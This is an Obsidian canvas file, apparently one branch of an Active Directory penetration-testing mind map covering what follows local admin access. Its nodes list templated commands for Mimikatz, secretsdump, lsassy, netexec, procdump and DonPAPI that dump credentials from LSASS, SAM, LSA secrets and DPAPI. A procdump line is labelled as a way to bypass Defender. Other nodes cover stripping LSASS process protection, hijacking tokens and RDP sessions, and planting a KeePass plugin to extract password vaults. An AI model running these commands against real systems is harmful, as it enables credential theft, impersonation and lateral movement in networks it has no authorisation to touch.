{
	"nodes":[
		{"id":"fab9419f4c11882b","type":"group","x":-1120,"y":-1040,"width":3800,"height":7360,"color":"#ff78ff","label":"GOT LOCAL ADMIN"},
		{"id":"4f87af3ce9fdb8dc","type":"group","x":-2880,"y":606,"width":1080,"height":760,"label":"NO CREDENTIALS"},
		{"id":"2604160c40c5e703","type":"text","text":"# 🔥 Extract credentials from LSA \n\n\n>[!info] Theory\n> - https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets#theory\n\n\n>[!example] Tools\n>- [Netexec  Sam option](https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets#practice)\n>- [Mimikatz](https://github.com/gentilkiwi/mimikatz)\n>- [Impacket's secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)\n>- [Impackets reg.py](https://github.com/fortra/impacket/blob/master/examples/reg.py)\n\n```shell\n# Dumping through lsa\n🕷️ nxc smb '<ip_range>' -u '<user>' -p '<password>' --lsa\n# Dumping through mimikatz\n🔵 mimikatz \"privilege::debug\" \"lsadump::lsa\" \"exit\"\n# Dumping lsa with impackets secretsdump\n⚪ secretsdump.py '<domain>'/'<user>':'<password>'@'<ip>'\n# Dumping lsa and system hive\n🔵 reg save HKLM\\SAM 'sam.hive';  reg save HKLM\\SYSTEM 'system.hive'\n# Dumping lsa through impackets reg.py\n⚪ reg.py '<domain>'/'<user>':'<password>'@'<ip>' backup -o '\\\\<smb_ip>\\share'\n# Extract secrets from sam and system\n⚪ secretsdump.py -system 'system' -sam 'sam.hive' 'LOCAL'\n# Dumping through metasploit \nⓂ️ msf> hashdump\n```","x":-160,"y":976,"width":1520,"height":744},
		{"id":"216eca3f91fea106","type":"text","text":"# 🔥 Extract credentials from SAM \n\n>[!info] Theory\n> - https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets#theory\n\n\n>[!example] Tools\n>- [Netexec  Sam option](https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets#practice)\n>- [Mimikatz](https://github.com/gentilkiwi/mimikatz)\n>- [Impacket's secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)\n>- [Impackets reg.py](https://github.com/fortra/impacket/blob/master/examples/reg.py)\n\n```shell\n# Dumping through sam\n🕷️ nxc smb '<ip_range>' -u '<user>' -p '<password>' --sam\n# Dumping through mimikatz\n🔵 mimikatz \"privilege::debug\" \"lsadump::sam\" \"exit\"\n# Dumping sam with impackets secretsdump\n⚪ secretsdump.py '<domain>'/'<user>':'<password>'@'<ip>'\n# Dumping Sam and system hive\n🔵 reg save HKLM\\SAM 'sam.hive';  reg save HKLM\\SYSTEM 'system.hive'\n# Dumping sam through impackets reg.py\n⚪ reg.py '<domain>'/'<user>':'<password>'@'<ip>' backup -o '\\\\<smb_ip>\\share'\n# Extract secrets from sam and system\n⚪ secretsdump.py -system 'system' -sam 'sam.hive' 'LOCAL'\n# Dumping through metasploit \nⓂ️ msf> hashdump\n```","x":-160,"y":110,"width":1520,"height":772},
		{"id":"0f84ee382df29c2b","type":"text","text":"# 🔥 Extract credentials from LSASS.exe\n\n\n>[!info] Theory \n>- https://www.thehacker.recipes/ad/movement/credentials/dumping/lsass\n\n>[!example] Tools\n>- [Mimikatz](https://github.com/gentilkiwi/mimikatz)\n>- [Lsassy](https://github.com/login-securite/lsassy)\n>- [ProcDump]([procdump](https://live.sysinternals.com/procdump.exe))\n>- [Netexec ](https://github.com/Pennyw0rth/NetExec)\n\n```shell\n# Try Remove protection on lsass.exe process\n🔵 mimikatz \"!+\" \"!processprotect /process:lsass.exe /remove\" \"privilege::debug\" \"token::elevate\"  \"sekurlsa::logonpasswords\" \"!processprotect  /process:lsass.exe\" \"!-\" \n```\n\n\n```shell\n# Dumping through mimikatz\n🔵 mimikatz \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\"  \"exit\"\n# Dumping with lsassy python script\n⚪ lsassy -d '<domain>' -u '<user>' -p '<password>' '<ip>'\n# Dumping with netexec through lsassy module\n🕷️ nxc smb '<ip_range>' -u '<user>' -p '<password>' -M lsassy\n# Dumping through procdump from sysinternals and with lsass' pid to bypasss defender\n🔵 procdump -accepteula -ma '$lsass_pid' lsass.dmp\n# Dumping Through mimikatz kiwi module in metasploit\nⓂ️ msf> load kiwi creds_all\n```\n","x":-160,"y":-1000,"width":1520,"height":760},
		{"id":"20acccfbd84b5a4f","type":"text","text":"# CREDENTIALS FOUND","x":1770,"y":1600,"width":380,"height":50,"color":"4"},
		{"id":"34e66c021511ebb2","type":"text","text":"# MsCacheV2","x":1768,"y":1290,"width":382,"height":50,"color":"2"},
		{"id":"4d36e7bd62d779e5","type":"file","file":"INTERACTIVE-MAP.canvas","x":-2800,"y":686,"width":920,"height":600},
		{"id":"1f1e49650dff78f3","type":"text","text":"# PassTheHash","x":1766,"y":690,"width":382,"height":50,"color":"6"},
		{"id":"36978ad219fb3afe","type":"text","text":"# GOT LOCAL ADMIN","x":-1080,"y":456,"width":360,"height":81,"color":"#ff78ff"},
		{"id":"d1c553e67fd5f4b7","type":"text","text":"# HASH  FOUND (NT)","x":1766,"y":340,"width":382,"height":41,"color":"2"},
		{"id":"0a618c454f356bbd","type":"text","text":"# HASH  FOUND (NT)","x":1579,"y":-645,"width":382,"height":50,"color":"2"},
		{"id":"d5c75e5095b6229b","type":"text","text":"# PassTheHash","x":1579,"y":-535,"width":382,"height":50,"color":"6"},
		{"id":"335bbfe6000f4fae","type":"text","text":"# CREDENTIALS FOUND","x":1581,"y":-755,"width":380,"height":50,"color":"4"},
		{"id":"09d21e83558458da","type":"text","text":"# Impersonation\n\n## Impersonate with ADCS\n\n>[!info] Theory\n>- [«4ksec's blog](https://z4ksec.github.io/posts/masky-release-v0.0.3/)\n\n\n>[!example] Tools\n>- [Masky](https://github.com/Z4kSec/Masky/tree/master)\n\n\n```shell\n#Commands\n\n⚪ masky - d <domain> -u <user>  (-p '<password>' || -k || -H <hash>) -ca '<certificate authority>' '<ip>'\n⚫ : CMD commands\n🔵 : Powershell commands\n🟣 : Impackets\n🔴 : Bloodhound \n🟡 : Powerview\n🕷️ : Netexec\nⓂ️ : Metasploit\n\n```\n\n--- \n\n## Impersonate (act on behalf of) \n\n>[!info] Theory\n>- [netexec's logged-on user](https://www.netexec.wiki/smb-protocol/impersonate-logged-on-users)\n>- [Sensepost's blog](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)\n\n>[!example] Tools\n>- [Netexec ](https://github.com/Pennyw0rth/NetExec)\n>- [Metasploit](https://docs.metasploit.com/)\n>- [Zblurx's impersonate-rs](https://github.com/zblurx/impersonate-rs)\n\n\n```shell\nⓂ️ msf> use incognito impersonate_token '<domain>'\\\\'<user>'\n🕷️ nxc smb '<ip>' -u '<localAdmin>' -p '<password>' --loggedon-users\n🕷️ nxc smb '<ip>' -u '<localAdmin>' -p '<password>' -M schtask_as -o USER='<logged-on-user>' CMD='<cmd-command>'\n🔵 irs.exe list; irs.exe exec -p '<pid>' -c '<command>'\n```\n\n## Impersonate RDP session\n\n>[!info] Theory\n> - [RedTeam notes](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/lateral-movement/t1563-remote-service-session-hijacking/rdp-hijacking)\n\n>[!example] Tools\n>- [psexec.exe](https://learn.microsoft.com/fr-fr/sysinternals/downloads/psexec)\n>- [tscon.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tscon)\n\n```shell\n🔵 psexec.exe -s -i cmd\n🔵 query user\n🔵 tscon.exe '<id>' /dest:'<session_name>'\n```","x":-160,"y":1760,"width":1520,"height":1780},
		{"id":"46ba70412a222839","type":"text","text":"# Extract credentials from DPAPI\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets#theory\n>- https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf\n\n\n>[!example] Tools\n>- [login-securite's Donpapi](https://github.com/login-securite/DonPAPI)\n>- [Ghostpack's SharpDpapi](https://github.com/GhostPack/SharpDPAPI)\n>- [Mimikatz](https://github.com/gentilkiwi/mimikatz)\n>- [Lsassy](https://github.com/login-securite/lsassy)\n\n```shell\n# Dumping dpapi secrets using donpapi\n⚪ donpapi '<domain>'/'<user>':'<password>'@'<target>'\n# Dumping using netexec option --dpapi\n🕷️ nxc smb '<ip_range>' -u '<user>' -p '<password>' --dpapi 'cookies' --dpapi 'nosystem'\n# Dumping using SharpDPAPI\n⚫ SharpDPAPI.exe triage\n# Dumping using impacket's dpapidump\n⚪ dpapidump.py '<domain>'/'<user>':'<password>'@'<target>'\n```\n\n## Get masterkey\n\n```shell\n# Obtain masterkey mimikatz\n🔵 mimikatz \"sekurlsa::dpapi\"\n# Obtain masterkey using lsassy\n⚪ lsassy -d '<domain>' -u '<user>' -p '<password>' '<ip>' -m rdrleakdiag -M masterkeys\n# Dumping creds twith dploot\n⚪ dploot.py browser -d '<domain>' -u '<user>' -p '<password>' '<ip>' -mkfile '<masterkeys_file>'\n```\n\n---\n## Cracking Users Masterkey\n\n>[!example] Tools\n>- [DPAPIlmk2John](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)\n\n```shell\n# Remove attribute protection\n🔵 attrib -a -h -s \"C:/Users/<user>/AppData/Roaming/Microsoft/Protect/<SID>/*\"\n# Download folder containing private key file\n🔵 copy c:\\users\\<user>\\AppData\\Roaming\\Microsoft\\Protect\\<SID> \n# retrieve masterkey \n⚪ DPAPImk2john.py --preferred '<prefered_file>'\n# Dump masterkey hash\n⚪ DPAPImk2john.py -c 'domain' -mk '<masterkey>' -S '<sid>'\n```","x":-160,"y":4880,"width":1520,"height":1360},
		{"id":"153cde0757c53c7d","type":"text","text":"# MISC\n\n## Find Users\n\n>[!info] Theory\n>-\n>-\n>-\n\n>[!example] Tools\n>- [SmbMap](https://github.com/ShawnDEvans/smbmap)\n>- [Keepwn](https://github.com/Orange-Cyberdefense/KeePwn)\n>- [Netexec](https://github.com/Pennyw0rth/NetExec)\n\n```shell\n⚪ smbmap.py --host-file ./computers.list -u <user> -p <password> -d <domain> -r 'C$\\Users' --dir-only --no-write-check --no-update --no-color --csv users_directory.csv\n🔵 : Powershell commands\n🟣 : Impackets\n🕷️ : Netexec\n\n\n```\n\n## Extract Keepass\n\n>[!info] Theory\n>-\n>-\n>-\n\n>[!example] Tools\n>- [Keepwn](https://github.com/Orange-Cyberdefense/KeePwn)\n\n```shell\n⚪ KeePwn.py plugin add -u '<user>' -p '<password>' -d '<domain>' -t '<target>' --plugin KeeFarceRebornPlugin.dll\n\n⚪ KeePwn.py trigger add -u '<user>' -p '<password>' -d '<domain>' -t '<target>'\n```","x":-160,"y":3600,"width":1520,"height":1200}
	],
	"edges":[
		{"id":"1be3266bb04b2f91","fromNode":"0f84ee382df29c2b","fromSide":"right","toNode":"335bbfe6000f4fae","toSide":"left"},
		{"id":"cbd9c65ec51b3f1c","fromNode":"0f84ee382df29c2b","fromSide":"right","toNode":"0a618c454f356bbd","toSide":"left"},
		{"id":"9d7776dce4cc4d8c","fromNode":"0f84ee382df29c2b","fromSide":"right","toNode":"d5c75e5095b6229b","toSide":"left"},
		{"id":"1e31a6044281a0ac","fromNode":"216eca3f91fea106","fromSide":"right","toNode":"d1c553e67fd5f4b7","toSide":"left"},
		{"id":"04034c54b38d5242","fromNode":"216eca3f91fea106","fromSide":"right","toNode":"1f1e49650dff78f3","toSide":"left"},
		{"id":"187230de41a9df6d","fromNode":"2604160c40c5e703","fromSide":"right","toNode":"34e66c021511ebb2","toSide":"left"},
		{"id":"4dbaa0ec31c19769","fromNode":"2604160c40c5e703","fromSide":"right","toNode":"20acccfbd84b5a4f","toSide":"left"},
		{"id":"00402a6c44ae9914","fromNode":"4f87af3ce9fdb8dc","fromSide":"right","toNode":"fab9419f4c11882b","toSide":"left"},
		{"id":"e1fdac79f65eb36d","fromNode":"36978ad219fb3afe","fromSide":"right","toNode":"0f84ee382df29c2b","toSide":"left"},
		{"id":"77c963d252b82909","fromNode":"36978ad219fb3afe","fromSide":"right","toNode":"216eca3f91fea106","toSide":"left"},
		{"id":"0c82596acb00befc","fromNode":"36978ad219fb3afe","fromSide":"right","toNode":"2604160c40c5e703","toSide":"left"}
	]
}